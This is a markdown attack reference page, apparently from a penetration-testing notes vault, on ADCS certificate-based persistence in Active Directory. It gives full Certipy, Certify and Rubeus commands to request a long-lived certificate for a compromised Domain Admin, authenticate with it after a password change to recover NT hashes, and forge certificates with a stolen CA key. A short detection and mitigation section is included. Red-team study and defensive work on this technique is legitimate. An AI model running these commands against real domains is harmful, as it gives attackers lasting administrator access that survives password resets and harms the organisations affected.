---
title: "Attack #67 — ADCS Certificate-Based Persistence"
description: "An attacker who has compromised a DA account can request a long-lived client authentication certificate for that account. Even after the DA password is…"
category: active-directory
tags: ["active-directory", "adcs", "persistence", "hashing"]
tools: ["Rubeus", "Certipy", "Certify", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Eight/🟤 Attack #67 — ADCS Certificate-Based Persistence.md"
---
# 🟤 Attack #67 — ADCS Certificate-Based Persistence

***

## 📖 How It Works

An attacker who has compromised a DA account can **request a long-lived client authentication certificate** for that account. Even after the DA password is changed, the certificate remains valid for authentication via PKINIT — typically for 1 year or more. Combined with **Golden Certificate (#35)** (stealing the CA private key to forge unlimited certs), ADCS persistence is the strongest persistence mechanism in AD.

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **DA or target user credentials** | To request a certificate |
| **ADCS deployed** | With Client Authentication templates available |

***

## 💻 Full Commands

```bash
# ── Request a long-lived cert as Administrator ────────────────────────────────
certipy req -u Administrator@corp.local -p 'Password1' -ca CORP-CA \
  -template User -dc-ip 10.10.10.10
# Output: administrator.pfx (valid for template's configured lifetime, default 1 year)

# ── Use cert after password change (months later) ────────────────────────────
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
# Returns current NT hash — even though password was changed

# ── Golden Certificate (ultimate persistence — Attack #35) ───────────────────
# Forge unlimited certificates using stolen CA key:
certipy forge -ca-pfx CORP-CA.pfx -upn Administrator@corp.local -subject "CN=Administrator"
certipy auth -pfx forged_administrator.pfx -dc-ip 10.10.10.10
```

```powershell
# ── Certify (Windows) ─────────────────────────────────────────────────────────
.\Certify.exe request /ca:CORP-CA /template:User
# Convert PEM to PFX, then use Rubeus for PKINIT:
.\Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /password:pass /ptt
```

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4886** | Security Log (CA) | Certificate enrollment by admin account |
| **4768** | Security Log (DC) | PKINIT authentication — smart card logon for non-smart-card user |

***

## 🔗 Attack Chain Context

```
[ADCS Persistence] ──→ Long-lived certificates survive password changes
         │
         ├──→ 🔒 Cert valid 1+ year — outlasts password rotation policies
         ├──→ 💀 Golden Certificate: forge unlimited certs = permanent access
         └──→ 💀 Defeated by: short cert lifetimes, CA key protection, cert revocation
```

***

> ✅ **Attack #67 — ADCS Certificate-Based Persistence complete.**

***

> 🏁 **Category 8 — Persistence Techniques is now COMPLETE (7/7 attacks).**
